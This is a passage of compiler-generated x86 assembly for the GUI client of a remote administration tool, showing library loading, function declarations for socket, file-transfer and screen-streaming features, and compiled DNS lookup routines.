;
; [2] ' A Remote Administration Application
;
; [4] PROGRAM	"client"
;
; [5] VERSION	"0.7"
;
; [6] ' MAKEFILE "xexe.xxx"
;
; [7] ' CONSOLE
;
; [9] IMPORT "xst"
;
; [10] IMPORT "gdi32"
.code
	jmp	%_StartApplication			;;; i37a
PrologCode.client:
	push	ebp			;;; i38
	mov	ebp,esp			;;; i39
	sub	esp,256			;;; i40
	mov	eax,addr @_string.002C.client			;;; i663
	push	eax
	call	_XxxXstLoadLibrary@4
	test	eax,eax
	jz	> A.2			;;; i40a
	push	eax
	mov	ebx,addr @_string.002C.client			;;; i663
	push	addr @_string.StartLibrary.client			;;; i41
	push	ebx			;;; i41a
	push	0			;;; i41b
	call	main.concat			;;; i41c
	add	esp,12			;;; i41d
	pop	ebx
	push	eax
	push	eax
	push	ebx
	call	_GetProcAddress@8
	test	eax,eax
	jz	> A.1
	call	eax
A.1:
	pop	esi
	call	%____free
A.2:
;
; [11] IMPORT "wsock32"
	mov	eax,addr @_string.002D.client			;;; i663
	push	eax
	call	_XxxXstLoadLibrary@4
	test	eax,eax
	jz	> A.4			;;; i40a
	push	eax
	mov	ebx,addr @_string.002D.client			;;; i663
	push	addr @_string.StartLibrary.client			;;; i41
	push	ebx			;;; i41a
	push	0			;;; i41b
	call	main.concat			;;; i41c
	add	esp,12			;;; i41d
	pop	ebx
	push	eax
	push	eax
	push	ebx
	call	_GetProcAddress@8
	test	eax,eax
	jz	> A.3
	call	eax
A.3:
	pop	esi
	call	%____free
A.4:
;
; [12] IMPORT "kernel32"
	mov	eax,addr @_string.002E.client			;;; i663
	push	eax
	call	_XxxXstLoadLibrary@4
	test	eax,eax
	jz	> A.6			;;; i40a
	push	eax
	mov	ebx,addr @_string.002E.client			;;; i663
	push	addr @_string.StartLibrary.client			;;; i41
	push	ebx			;;; i41a
	push	0			;;; i41b
	call	main.concat			;;; i41c
	add	esp,12			;;; i41d
	pop	ebx
	push	eax
	push	eax
	push	ebx
	call	_GetProcAddress@8
	test	eax,eax
	jz	> A.5
	call	eax
A.5:
	pop	esi
	call	%____free
A.6:
;
; [13] IMPORT "msvcrt"
	mov	eax,addr @_string.002F.client			;;; i663
	push	eax
	call	_XxxXstLoadLibrary@4
	test	eax,eax
	jz	> A.8			;;; i40a
	push	eax
	mov	ebx,addr @_string.002F.client			;;; i663
	push	addr @_string.StartLibrary.client			;;; i41
	push	ebx			;;; i41a
	push	0			;;; i41b
	call	main.concat			;;; i41c
	add	esp,12			;;; i41d
	pop	ebx
	push	eax
	push	eax
	push	ebx
	call	_GetProcAddress@8
	test	eax,eax
	jz	> A.7
	call	eax
A.7:
	pop	esi
	call	%____free
A.8:
;
; [14] IMPORT "user32"
	mov	eax,addr @_string.0030.client			;;; i663
	push	eax
	call	_XxxXstLoadLibrary@4
	test	eax,eax
	jz	> A.10			;;; i40a
	push	eax
	mov	ebx,addr @_string.0030.client			;;; i663
	push	addr @_string.StartLibrary.client			;;; i41
	push	ebx			;;; i41a
	push	0			;;; i41b
	call	main.concat			;;; i41c
	add	esp,12			;;; i41d
	pop	ebx
	push	eax
	push	eax
	push	ebx
	call	_GetProcAddress@8
	test	eax,eax
	jz	> A.9
	call	eax
A.9:
	pop	esi
	call	%____free
A.10:
;
; [15] IMPORT "shell32"
	mov	eax,addr @_string.0031.client			;;; i663
	push	eax
	call	_XxxXstLoadLibrary@4
	test	eax,eax
	jz	> A.12			;;; i40a
	push	eax
	mov	ebx,addr @_string.0031.client			;;; i663
	push	addr @_string.StartLibrary.client			;;; i41
	push	ebx			;;; i41a
	push	0			;;; i41b
	call	main.concat			;;; i41c
	add	esp,12			;;; i41d
	pop	ebx
	push	eax
	push	eax
	push	ebx
	call	_GetProcAddress@8
	test	eax,eax
	jz	> A.11
	call	eax
A.11:
	pop	esi
	call	%____free
A.12:
;
; [16] IMPORT "comctl32"
	mov	eax,addr @_string.0032.client			;;; i663
	push	eax
	call	_XxxXstLoadLibrary@4
	test	eax,eax
	jz	> A.14			;;; i40a
	push	eax
	mov	ebx,addr @_string.0032.client			;;; i663
	push	addr @_string.StartLibrary.client			;;; i41
	push	ebx			;;; i41a
	push	0			;;; i41b
	call	main.concat			;;; i41c
	add	esp,12			;;; i41d
	pop	ebx
	push	eax
	push	eax
	push	ebx
	call	_GetProcAddress@8
	test	eax,eax
	jz	> A.13
	call	eax
A.13:
	pop	esi
	call	%____free
A.14:
;
; [17] IMPORT "comdlg32"
	mov	eax,addr @_string.0033.client			;;; i663
	push	eax
	call	_XxxXstLoadLibrary@4
	test	eax,eax
	jz	> A.16			;;; i40a
	push	eax
	mov	ebx,addr @_string.0033.client			;;; i663
	push	addr @_string.StartLibrary.client			;;; i41
	push	ebx			;;; i41a
	push	0			;;; i41b
	call	main.concat			;;; i41c
	add	esp,12			;;; i41d
	pop	ebx
	push	eax
	push	eax
	push	ebx
	call	_GetProcAddress@8
	test	eax,eax
	jz	> A.15
	call	eax
A.15:
	pop	esi
	call	%____free
A.16:
;
; [18] IMPORT "advapi32"
	mov	eax,addr @_string.0034.client			;;; i663
	push	eax
	call	_XxxXstLoadLibrary@4
	test	eax,eax
	jz	> A.18			;;; i40a
	push	eax
	mov	ebx,addr @_string.0034.client			;;; i663
	push	addr @_string.StartLibrary.client			;;; i41
	push	ebx			;;; i41a
	push	0			;;; i41b
	call	main.concat			;;; i41c
	add	esp,12			;;; i41d
	pop	ebx
	push	eax
	push	eax
	push	ebx
	call	_GetProcAddress@8
	test	eax,eax
	jz	> A.17
	call	eax
A.17:
	pop	esi
	call	%____free
A.18:
;
; [19] IMPORT "p2pfiled.dec"
;
; [20] IMPORT "net.dec"
;
; [21] IMPORT "fs.obj"' compile fs.x (as library) first to obtain both fs.lib and fs.dll
;
; [24] $$Tab1	= 120
;
; [25] $$main = 200
;
; [26] $$event = 201
;
; [27] $$stream = 202
;
; [28] $$download = 203
;
; [29] $$upload = 204
;
; [30] $$tree = 205
;
; [32] $$DNL_go	= 501
;
; [33] $$DNL_path	= 502
;
; [34] $$DNL_port	= 503
;
; [35] $$DNL_browse = 504
;
; [37] $$UPL_go	= 511
;
; [38] $$UPL_path	= 512
;
; [39] $$UPL_port	= 513
;
; [40] $$UPL_browse = 514
;
; [42] $$TreePop_Title		= 160' file menu
;
; [43] $$TreePop_DownL		= 161
;
; [44] $$TreePop_CreateD	= 162
;
; [45] $$TreePop_DelFile	= 163
;
; [46] $$TreePop_Rename	= 164
;
; [47] $$TreePop_Refresh	= 165
;
; [49] $$TreePop_DTitle	= 170' folder menu
;
; [50] $$TreePop_UpL		= 171
;
; [51] $$TreePop_RemTree	= 172
;
; [52] $$TreePop_DelDir	= 173
;
; [53] $$TreePop_RemFiles	= 174
;
; [54] $$TreePop_Prop		= 175
;
; [56] $$EventURL_Open		= 180
;
; [58] $$EM_SETLIMITTEXT = 197
;
; [60] $$FILE_ATTRIBUTE_SPARSE_FILE	= 512' from winnt.h, add to kernel32.dec
;
; [61] $$FILE_ATTRIBUTE_REPARSE_POINT	= 1024
;
; [62] $$FILE_ATTRIBUTE_OFFLINE	= 0x1000
;
; [63] $$FILE_ATTRIBUTE_NOT_CONTENT_INDEXED = 0x2000
;
; [64] $$FILE_ATTRIBUTE_ENCRYPTED	= 0x4000
;
; [65] $$FILE_ATTRIBUTE_DEVICE = 64
;
; [68] PACKED TTREE
;
; [69] XLONG		.hParent
;
; [70] XLONG		.hItem
;
; [71] XLONG		.child' 1 = has child, 0 = no child
;
; [72] END TYPE
;
; [74] DECLARE FUNCTION Entry ()
;
; [75] DECLARE FUNCTION Initialize ()
;
; [76] DECLARE FUNCTION InitGUIsubsystem ()
;
; [77] DECLARE FUNCTION Shutdown ()
;
; [79] DECLARE FUNCTION  WndProc (hwnd, msg, wParam, lParam)
;
; [80] DECLARE FUNCTION  CenterWindow (hwnd)
;
; [81] DECLARE FUNCTION  InitGui ()
;
; [82] DECLARE FUNCTION  RegisterWinClass (className$, titleBar$)
;
; [83] DECLARE FUNCTION  CreateWindows ()
;
; [84] DECLARE FUNCTION  NewWindow (className$, titleBar$, style, x, y, w, h, exStyle)
;
; [85] DECLARE FUNCTION  NewChild (className$, text$, style, x, y, w, h, parent, id, exStyle)
;
; [86] DECLARE FUNCTION  MessageLoop ()
;
; [87] DECLARE FUNCTION  CreateCallbacks ()
;
; [88] DECLARE FUNCTION  eventProc (hWnd, msg, wParam, lParam)
;
; [89] DECLARE FUNCTION  EditProc (hWnd, msg, wParam, lParam)
;
; [90] DECLARE FUNCTION  downProc (hWnd, msg, wParam, lParam)
;
; [91] DECLARE FUNCTION  upProc (hWnd, msg, wParam, lParam)
;
; [92] DECLARE FUNCTION  edit3Proc (hWnd, msg, wParam, lParam)
;
; [93] DECLARE FUNCTION  edit6Proc (hWnd, msg, wParam, lParam)
;
; [94] DECLARE FUNCTION  tab6Proc (hWnd, msg, wParam, lParam)
;
; [95] DECLARE FUNCTION  SetColor (txtColor, bkColor, wParam, lParam)
;
; [96] DECLARE FUNCTION  NewFont (fontName$, pointSize, weight, italic, underline)
;
; [97] DECLARE FUNCTION  SetNewFont (hwndCtl, hFont)
;
; [98] DECLARE FUNCTION  CleanUp ()
;
; [99] DECLARE FUNCTION  InstallTrayIcon (hwnd)
;
; [100] DECLARE FUNCTION  RemoveTrayIcon ()
;
; [101] DECLARE FUNCTION  AddEditText (idx, STRING text)
;
; [102] DECLARE FUNCTION  ClearEditText (edit)
;
; [103] DECLARE FUNCTION  HIWORD (x)
;
; [104] DECLARE FUNCTION  LOWORD (x)
;
; [105] DECLARE FUNCTION  RGB (r, g, b)
;
; [106] DECLARE FUNCTION  ShowOpenFileDialog (hWndOwner, @fileName$, filter$, initDir$, title$)
;
; [107] DECLARE FUNCTION  ShowSaveFileDialog (hWndOwner, @fileName$, filter$, initDir$, title$)
;
; [108] DECLARE FUNCTION  AddTreeViewItem (hwndCtl, hParent, label$, idxImage, idxSelectedImage, hInsertAfter)
;
; [109] DECLARE FUNCTION  GetSysFolderIcon (file$, @hIconFolder, @iIconFolder, @hIconFolderOpen, @iIconFolderOpen)
;
; [110] DECLARE FUNCTION  InitTreeViewImageList (hTreeView)
;
; [111] DECLARE FUNCTION  STRING GetWindowsDir()
;
; [113] DECLARE FUNCTION DecomposePathname (pathname$, path$, parent$, filename$, file$, extent$)
;
; [114] DECLARE FUNCTION getLastSlash(str$, stop)
;
; [115] DECLARE FUNCTION GetNotifyMsg (lParam, hwndFrom, idFrom, code)
;
; [116] DECLARE FUNCTION GetTabChild (htabc)
;
; [117] DECLARE FUNCTION AddEditTabChild (hparent,STRING title,IDC,scroll)
;
; [118] DECLARE FUNCTION AddTreeTabChild (hparent,STRING title,IDC,style)
;
; [120] DECLARE FUNCTION sConnect (idx)
;
; [121] DECLARE FUNCTION sBind (socket,ipaddress$,port)
;
; [122] DECLARE FUNCTION sListen (idx)
;
; [123] DECLARE FUNCTION sOpen (socket)
;
; [124] DECLARE FUNCTION sMessageListen (idx)
;
; [125] DECLARE FUNCTION OpenSConnection (idx)
;
; [126] DECLARE FUNCTION CloseSConnection (idx)
;
; [127] DECLARE FUNCTION SendSMessage (idx,buffer$)
;
; [128] DECLARE FUNCTION SendSMessageBin (idx,pbuffer,len)
;
; [130] DECLARE FUNCTION GetToken (str$,msg$,term)
;
; [131] DECLARE FUNCTION MessagePump (idx,str$)
;
; [132] DECLARE FUNCTION ProcessCommands (idx,str$)
;
; [133] DECLARE FUNCTION ProcessClientText (str$)
;
; [134] DECLARE FUNCTION ProcessClientCmd (idx,cmd$,msg$)
;
; [136] DECLARE FUNCTION JoinServer (idx,server$)
;
; [137] DECLARE FUNCTION DisconnectServer (idx)
;
; [139] DECLARE FUNCTION SessionLog (idx,msg$)
;
; [140] DECLARE FUNCTION EventLog (idx,msg$)
;
; [142] DECLARE FUNCTION STRING driveTypeToName (dtype)
;
; [143] DECLARE FUNCTION CPrint (ectrl,STRING text)
;
; [144] DECLARE FUNCTION sMessageListenBin (socket,size,lpbuffer)
;
; [145] DECLARE FUNCTION STRING trim (str$,char)
;
; [146] DECLARE FUNCTION STRING GetTokenEx (STRING text,term,offset)' forwards
;
; [147] DECLARE FUNCTION STRING GetLastErrorStr ()
;
; [148] DECLARE FUNCTION STRING WSAErrorToName (errorcode)
;
; [149] DECLARE FUNCTION streamscreen (idx)
;
; [151] DECLARE FUNCTION newSProfile ()
;
; [152] DECLARE FUNCTION setSPServer (idx,STRING server,port,STRING password,socket)
;
; [153] DECLARE FUNCTION getSPServer (idx,STRING address,port,STRING password,socket)
;
; [155] DECLARE FUNCTION ClientDownload (lptext)'(STRING text)
;
; [156] DECLARE FUNCTION ClientUpload (lptext)'(STRING text)
;
; [157] DECLARE FUNCTION ClientListen (STRING text)
;
; [159] DECLARE FUNCTION GetIPAddr (STRING name,STRING ip)' name to ip
;
; [160] DECLARE FUNCTION GetIPName (STRING ip,STRING name)' ip to name
;
; [162] DECLARE FUNCTION addToTree (STRING dir)
;
; [163] DECLARE FUNCTION refreshTreeNode(STRING dir)
;
; [164] DECLARE FUNCTION getTreeSelection (hwndCtl)
;
; [165] DECLARE FUNCTION STRING getTreeItemLabel (hwndCtl, hItem)
;
; [166] DECLARE FUNCTION STRING getTreeCompLabel (hItem)
;
; [167] DECLARE FUNCTION getTreeParent (hItem)
;
; [168] DECLARE FUNCTION verifyTreeItem (hParent,STRING dir)
;
; [169] DECLARE FUNCTION getTreeChild (hItem)
;
; [170] DECLARE FUNCTION setTreeChild (hItem)
;
; [171] DECLARE FUNCTION setTreeDrives (STRING drives)
;
; [172] DECLARE FUNCTION createTreeNewDir (hItem, STRING name)
;
; [173] DECLARE FUNCTION renameTreeFile (hItem, STRING name)
;
; [174] DECLARE FUNCTION TreeDelFile (hItem)
;
; [175] DECLARE FUNCTION TreeDelAllFiles (hItem)
;
; [176] DECLARE FUNCTION TreeDelDir (hItem)
;
; [177] DECLARE FUNCTION newTreeRootDir (STRING dir)
;
; [179] DECLARE FUNCTION processFileInfo (STRING info)
;
; [180] DECLARE FUNCTION STRING FileAttributeToName (a)
;
; [181] DECLARE FUNCTION STRING attributeCheck (STRING name)
;
; [182] DECLARE FUNCTION STRING FileSizeToName (GIANT fsize)
;
; [183] DECLARE FUNCTION STRING FileTimeToDateAndTime (filetimeh, filetimel)
;
; [185] DECLARE FUNCTION  EditStreamCallback (dwCookie, pbBuff, cb, pcb)
;
; [186] DECLARE FUNCTION  SetRichEditText (hWndRichEdit, fileName$, format)
;
; [187] DECLARE FUNCTION  CreateRichEdit (x, y, w, h, hParent, id, kbTextMax)
;
; [188] DECLARE FUNCTION AddRichEditTabChild (hparent,STRING title,IDC,style)
;
; [190] DECLARE FUNCTION LaunchBrowser (STRING url)
;
; [191] DECLARE FUNCTION  GetRegKey (key, subkey$, @retdata$)
;
; [193] FUNCTION  Entry ()
.code
	leave	;;; i160a
	ret				;;; i161 ;;; end prolog code
%_StartApplication:
	call	func1.client			;;; i162c
	ret	0			;;; i162d
align 16
_Entry.client@0:
;  *****
;  *****  FUNCTION  Entry ()  *****
;  *****
func1.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	call	%%%%initOnce.client
	sub	esp,220			;;; i114a
;
funcBody1.client:
;
; [196] IFF Initialize () THEN
	call	func2.client			;;; i619
	test	eax,eax			;;; i194
	jnz	>> else.0001.client			;;; i195
;
; [197] CPrint ($$main,"failed to initialize")
	mov	eax,addr @_string.00E8.client			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [198] Sleep(5000)
;
; [0] EXTERNAL FUNCTION Sleep (dwMilliseconds)
	push	5000			;;; i656a
	call	_Sleep@4			;;; i619
;
; [199] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func1.client			;;; i258
;
; [200] END IF
else.0001.client:
end.if.0001.client:
;
; [202] InitGUIsubsystem ()
	call	func3.client			;;; i619
;
; [203] Shutdown ()
	call	func4.client			;;; i619
;
; [204] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.Entry.client:  ;;; Function end label for Assembly Programmers.
end.func1.client:
	call	end_program.client			;;; i108
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
;-peep
;  *****
;  *****  END FUNCTION  Entry ()  *****
;  *****
%%%%initOnce.client:
	cmp d[%%%entered.client],-1		;;; i117
	jne > A.21	;;; i117a
	ret			;;; i117b
A.21:
	call	PrologCode.client			;;; i118a
	mov esi,addr %_begin_external_data_client
	mov edi,addr %_end_external_data_client
	call %_ZeroMemory
	call	InitSharedComposites.client			;;; i119
	mov	d[%%%entered.client],-1
	ret				;;; i120
data section 'client$internals'
align 4
%%%entered.client:
db 4 dup ?
.code
;
; [206] FUNCTION GetIPAddr (IPName$, numIPAddr$)
.code
;
#ifdef GetIPAddr.IPName$
#undef GetIPAddr.IPName$
#endif
#define GetIPAddr.IPName$ ebp+8	; exposes function argument 'IPName$'
;
;
#ifdef GetIPAddr.numIPAddr$
#undef GetIPAddr.numIPAddr$
#endif
#define GetIPAddr.numIPAddr$ ebp+12	; exposes function argument 'numIPAddr$'
;
align 16
_GetIPAddr.client@8:
;  *****
;  *****  FUNCTION  GetIPAddr ()  *****
;  *****
func4C.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,3				;;; ..
	xor	eax,eax			;;; ...
A.26:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.26			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,164			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	mov	ecx,13				;;; ..
	xor	eax,eax			;;; ...
A.27:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.27			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	lea	ebx,[esp+400]			;;; i125a
	lea	ecx,[esp+416]			;;; i125b
	mov	d[ebp-44],eax			;;; i670
	mov	d[ebp-48],ebx			;;; i670
	mov	d[ebp-52],ecx			;;; i670
funcBody4C.client:
;
; [207] WSADATA wsadata
; .composites = ebp-40	; internal variable
#ifdef GetIPAddr.wsadata
#undef GetIPAddr.wsadata
#endif
#define GetIPAddr.wsadata ebp-44	; exposes local variable 'wsadata'
;
;
; [208] HOSTENT	host
#ifdef GetIPAddr.host
#undef GetIPAddr.host
#endif
#define GetIPAddr.host ebp-48	; exposes local variable 'host'
;
;
; [211] IF (LEN(IPName$) < 3) THEN RETURN $$FALSE
	mov	eax,d[ebp+8]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.22			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.22:
	cmp	eax,3			;;; i684a
	jge	>> else.0002.client			;;; i219
	mov	eax,0			;;; i659
	jmp	end.func4C.client			;;; i258
else.0002.client:
end.if.0002.client:
;
; [212] host = gethostbyname (&IPName$)
;
; [0] EXTERNAL SFUNCTION  HOSTENT   gethostbyname    (addrSTRING)
; .compositeReturnAddr.0 = ebp-52	; internal variable
	mov	eax,d[ebp+8]			;;; i642
	push	eax			;;; i667a
	mov	ebx,d[ebp-52]			;;; i665
	call	_gethostbyname@4			;;; i619
	mov	ebx,d[ebp-48]			;;; i665
	mov	edi,ebx			;;; i14a
	mov	esi,eax			;;; i7
	mov	ecx,16			;;; i1
	call	%_AssignComposite			;;; i2
;
; [213] IF (host.h_addr_list != 0) THEN
	mov	eax,d[ebp-48]			;;; i665
	mov	eax,d[eax+12]			;;; i313b
	cmp	eax,0			;;; i684a
	je	>> else.0003.client			;;; i219
;
; [214] addr = 0
#ifdef GetIPAddr.addr
#undef GetIPAddr.addr
#endif
#define GetIPAddr.addr ebp-56	; exposes local variable 'addr'
;
	mov	eax,0			;;; i659
	mov	d[ebp-56],eax			;;; i670
;
; [215] RtlMoveMemory (&addr, host.h_addr_list, 4)
;
; [0] EXTERNAL FUNCTION RtlMoveMemory (pDestination, pSource, cbLength)
	lea	eax,[ebp-56]			;;; i642
; .xstk4C.0000 = ebp-64	; internal variable
	mov	d[ebp-64],eax			;;; i670
	mov	eax,d[ebp-48]			;;; i665
	mov	eax,d[eax+12]			;;; i313b
; .xstk4C.0001 = ebp-72	; internal variable
	mov	d[ebp-72],eax			;;; i670
	push	4			;;; i656a
	push	[ebp-72]			;;; i674a
	push	[ebp-64]			;;; i674a
	call	_RtlMoveMemory@12			;;; i619
;
; [216] RtlMoveMemory (&addr, addr, 4)
	lea	eax,[ebp-56]			;;; i642
	mov	d[ebp-64],eax			;;; i670
	push	4			;;; i656a
	push	[ebp-56]			;;; i674a
	push	[ebp-64]			;;; i674a
	call	_RtlMoveMemory@12			;;; i619
;
; [217] addr2 = inet_ntoa (addr)
#ifdef GetIPAddr.addr2
#undef GetIPAddr.addr2
#endif
#define GetIPAddr.addr2 ebp-76	; exposes local variable 'addr2'
;
;
; [0] EXTERNAL SFUNCTION  inet_ntoa        (in_addr)
	push	[ebp-56]			;;; i674a
	call	_inet_ntoa@4			;;; i619
	mov	d[ebp-76],eax			;;; i670
;
; [218] '		length = strlen (addr2)
;
; [219] numIPAddr$ = NULL$ (512)
	sub	esp,64			;;; i487
	mov	d[esp],512
	call	%_null.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp+12]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [220] RtlMoveMemory (&numIPAddr$, addr2, LEN(numIPAddr$))
	mov	eax,d[ebp+12]			;;; i642
	mov	d[ebp-64],eax			;;; i670
	mov	eax,d[ebp+12]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.23			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.23:
	push	eax			;;; i667a
	push	[ebp-76]			;;; i674a
	push	[ebp-64]			;;; i674a
	call	_RtlMoveMemory@12			;;; i619
;
; [221] numIPAddr$ = CSIZE$ (numIPAddr$)
	sub	esp,64			;;; i487
	mov	eax,[ebp+12]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_csize.d.v			;;; i583
	add	esp,64			;;; i600
	lea	ebx,[ebp+12]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [222] END IF
else.0003.client:
end.if.0003.client:
;
; [224] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func4C.client			;;; i258
;
; [225] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.GetIPAddr.client:  ;;; Function end label for Assembly Programmers.
end.func4C.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  GetIPAddr ()  *****
;  *****
;
; [227] FUNCTION GetIPName (numIPAddr$, IPName$)
.code
;
#ifdef GetIPName.numIPAddr$
#undef GetIPName.numIPAddr$
#endif
#define GetIPName.numIPAddr$ ebp+8	; exposes function argument 'numIPAddr$'
;
;
#ifdef GetIPName.IPName$
#undef GetIPName.IPName$
#endif
#define GetIPName.IPName$ ebp+12	; exposes function argument 'IPName$'
;
align 16
_GetIPName.client@8:
;  *****
;  *****  FUNCTION  GetIPName ()  *****
;  *****
func4D.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,3				;;; ..
	xor	eax,eax			;;; ...
A.32:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.32			;;; .....
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,168			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	mov	ecx,13				;;; ..
	xor	eax,eax			;;; ...
A.33:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.33			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	lea	ebx,[esp+400]			;;; i125a
	lea	ecx,[esp+416]			;;; i125b
	mov	d[ebp-44],eax			;;; i670
	mov	d[ebp-48],ebx			;;; i670
	mov	d[ebp-56],ecx			;;; i670
funcBody4D.client:
;
; [228] WSADATA wsadata
; .composites = ebp-40	; internal variable
#ifdef GetIPName.wsadata
#undef GetIPName.wsadata
#endif
#define GetIPName.wsadata ebp-44	; exposes local variable 'wsadata'
;
;
; [229] HOSTENT	host
#ifdef GetIPName.host
#undef GetIPName.host
#endif
#define GetIPName.host ebp-48	; exposes local variable 'host'
;
;
; [232] IF (LEN(numIPAddr$) < 3) THEN RETURN $$FALSE
	mov	eax,d[ebp+8]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.28			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.28:
	cmp	eax,3			;;; i684a
	jge	>> else.0004.client			;;; i219
	mov	eax,0			;;; i659
	jmp	end.func4D.client			;;; i258
else.0004.client:
end.if.0004.client:
;
; [233] addr = inet_addr (&numIPAddr$)
#ifdef GetIPName.addr
#undef GetIPName.addr
#endif
#define GetIPName.addr ebp-52	; exposes local variable 'addr'
;
;
; [0] EXTERNAL SFUNCTION  inet_addr        (addrSTRING)
	mov	eax,d[ebp+8]			;;; i642
	push	eax			;;; i667a
	call	_inet_addr@4			;;; i619
	mov	d[ebp-52],eax			;;; i670
;
; [234] host = gethostbyaddr (&addr, 4, $$AF_INET)
;
; [0] EXTERNAL SFUNCTION  HOSTENT   gethostbyaddr    (addrSTRING, length, type)
; .compositeReturnAddr.0 = ebp-56	; internal variable
	lea	eax,[ebp-52]			;;; i642
; .xstk4D.0000 = ebp-64	; internal variable
	mov	d[ebp-64],eax			;;; i670
	push	2			;;; i656a
	push	4			;;; i656a
	push	[ebp-64]			;;; i674a
	mov	ebx,d[ebp-56]			;;; i665
	call	_gethostbyaddr@12			;;; i619
	mov	ebx,d[ebp-48]			;;; i665
	mov	edi,ebx			;;; i14a
	mov	esi,eax			;;; i7
	mov	ecx,16			;;; i1
	call	%_AssignComposite			;;; i2
;
; [235] IF host.h_name != 0 THEN
	mov	eax,d[ebp-48]			;;; i665
	mov	eax,d[eax]			;;; i313b
	cmp	eax,0			;;; i684a
	je	>> else.0005.client			;;; i219
;
; [236] IPName$ = NULL$ (512)
	sub	esp,64			;;; i487
	mov	d[esp],512
	call	%_null.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp+12]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [237] RtlMoveMemory (&IPName$, host.h_name, LEN(IPName$))
	mov	eax,d[ebp+12]			;;; i642
	mov	d[ebp-64],eax			;;; i670
	mov	eax,d[ebp-48]			;;; i665
	mov	eax,d[eax]			;;; i313b
; .xstk4D.0001 = ebp-72	; internal variable
	mov	d[ebp-72],eax			;;; i670
	mov	eax,d[ebp+12]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.29			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.29:
	push	eax			;;; i667a
	push	[ebp-72]			;;; i674a
	push	[ebp-64]			;;; i674a
	call	_RtlMoveMemory@12			;;; i619
;
; [238] IPName$ = CSIZE$ (IPName$)
	sub	esp,64			;;; i487
	mov	eax,[ebp+12]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_csize.d.v			;;; i583
	add	esp,64			;;; i600
	lea	ebx,[ebp+12]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [239] END IF
else.0005.client:
end.if.0005.client:
;
; [241] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func4D.client			;;; i258
;
; [242] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.GetIPName.client:  ;;; Function end label for Assembly Programmers.
end.func4D.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
